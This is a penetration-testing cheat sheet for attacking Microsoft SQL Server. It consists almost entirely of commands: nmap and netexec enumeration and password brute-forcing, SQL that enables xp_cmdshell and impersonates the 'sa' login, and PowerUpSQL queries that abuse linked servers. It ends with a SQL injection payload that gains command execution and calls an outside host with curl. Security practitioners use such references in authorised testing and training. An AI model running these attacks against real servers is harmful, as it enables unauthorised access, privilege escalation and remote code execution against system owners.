---
description: Recon and pwning MSSQL Server
---

# MSSQL

### Enumerate MSSQL with Nmap

{% code overflow="wrap" %}
```bash
nmap --script ms-sql-info -p 1433 10.10.10.1
nmap -p 1433 --script ms-sql-ntlm-info --script-args mssql.instance-port=1433 10.10.10.1
# enumerate user with empty password
nmap -p 1433 --script ms-sql-empty-password 10.10.10.1
```
{% endcode %}

### Dictionary Attack

{% code overflow="wrap" %}
```bash
# nmap
nmap -p 1433 --script ms-sql-brute --script-args userdb=/opt/common_users.txt,passdb=/opt/unix_passwords.txt 10.10.10.1

# netexec
netexec mssql 10.10.10.1 -u /opt/common_users.txt -p /opt/unix_passwords.txt --local-auth --continue-on-success | grep -v "Login failed for user"
```
{% endcode %}

### Enable xp\_cmdshell

{% code overflow="wrap" %}
```sql
EXEC sp_configure 'show advanced options', '1'
RECONFIGURE
EXEC sp_configure 'xp_cmdshell', '1' 
RECONFIGURE
```
{% endcode %}

### Impersonate Other User

{% code overflow="wrap" %}
```bash
# Find users you can impersonate
SELECT distinct b.name
FROM sys.server_permissions a
INNER JOIN sys.server_principals b
ON a.grantor_principal_id = b.principal_id
WHERE a.permission_name = 'IMPERSONATE'
# Check if the user "sa" or any other high privileged user is mentioned

# Impersonate sa user
EXECUTE AS LOGIN = 'sa'
SELECT SYSTEM_USER
SELECT IS_SRVROLEMEMBER('sysadmin')
```
{% endcode %}

### Impacket-MSSQLClient

```bash
impacket-mssqlclient admin:p@ssw0rd@10.10.10.1
# check if we have 'sa' privilege
select IS_SRVROLEMEMBER ('sysadmin')
# execute command using xp_cmdshell
xp_cmdshell "whoami /priv"
```

<figure><img src="https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEiNC_SOLTJDrgSTRUw0w-mM4S3OBn2VgbKzbqysFXxuh4DML0q9fGFrZJQQL14eKyweQoCVzRDLYW9PXF2GeCSoRAFwpNsCS97swvAQ27X_6ZpanQCbZDIjo4uJ_BH2hDMQ8VZ2loKM_uSMZ7hdFkNUhPTXeDc3J2ASqnqM6A-07nJCw8xgygxk9SEJvzI/s1068/mssql%20impacket.png" alt=""><figcaption><p>Impacket-MSSQLClient</p></figcaption></figure>

Or, use Nmap to execute xp\_cmdshell:

{% code overflow="wrap" %}
```bash
nmap -p 1433 --script ms-sql-xp-cmdshell --script-args mssql.username=admin,mssql.password='p@ssw0rd',ms-sql-xp-cmdshell.cmd="ipconfig" 10.10.10.1
```
{% endcode %}

## PowerUpSQL Stuff

### Check Instance

```bash
get-sqlinstancelocal
get-sqlinstancedomain
Get-SQLConnectionTest -Instance "sql03.zerobyte.id,1433"
```

### Get SQL Instance Info

```
get-sqlserverinfo -instance "WEB06\SQLEXPRESS"
```

### Check Database Links

{% code overflow="wrap" %}
```bash
# AT Command
get-sqlquery -instance "WEB06\SQLEXPRESS" -query "execute as login ='sa'; EXEC ('sp_linkedservers') at SQL03" -Verbose
```
{% endcode %}

### Create or Update Login Mapping

{% code overflow="wrap" %}
```bash
get-sqlquery -instance "WEB06\SQLEXPRESS" -query "EXEC sp_addlinkedsrvlogin 'SQL27', true;" - Verbose
```
{% endcode %}

### Check user can be impersonated

{% code overflow="wrap" %}
```bash
Get-SQLQuery -Instance 'WEB06\SQLEXPRESS' -query "SELECT distinct b.name FROM sys.server_permissions a INNER JOIN sys.server_principals b ON a.grantor_principal_id = b.principal_id WHERE a.permission_name = 'IMPERSONATE';"
```
{% endcode %}

### Enable xp\_cmdshell

On local instance

{% code overflow="wrap" %}
```bash
get-sqlquery -query "execute as login ='sa'; EXEC sp_configure 'show advanced options', '1'; RECONFIGURE; EXEC sp_configure 'xp_cmdshell', '1'; RECONFIGURE; EXEC('xp_cmdshell ''whoami'';" -Verbose
```
{% endcode %}

AT command

{% code overflow="wrap" %}
```bash
get-sqlquery -instance "WEB06\SQLEXPRESS" -query "EXECUTE AS LOGIN = 'sa'; EXEC ('EXEC sp_configure ''show advanced options'', 1; RECONFIGURE; EXEC sp_configure ''xp_cmdshell'', 1; RECONFIGURE; REVERT;') AT SQL03;" -Verbose
```
{% endcode %}

### Enable RPC Out

{% code overflow="wrap" %}
```bash
Get-SQLQuery -instance "WEB06\SQLEXPRESS" -query "execute as login ='sa'; exec sp_serveroption 'SQL03', 'rpc out', 'true';" - Verbose
```
{% endcode %}

## SQL Injection Payload

SQLi to RCE

{% code overflow="wrap" %}
```bash
1'; EXECUTE AS LOGIN = 'sa'; EXEC sp_configure 'show advanced options', '1'; RECONFIGURE; EXEC sp_configure 'xp_cmdshell', '1'; RECONFIGURE; EXEC xp_cmdshell 'curl http://192.168.x.x:8088/'; --
```
{% endcode %}
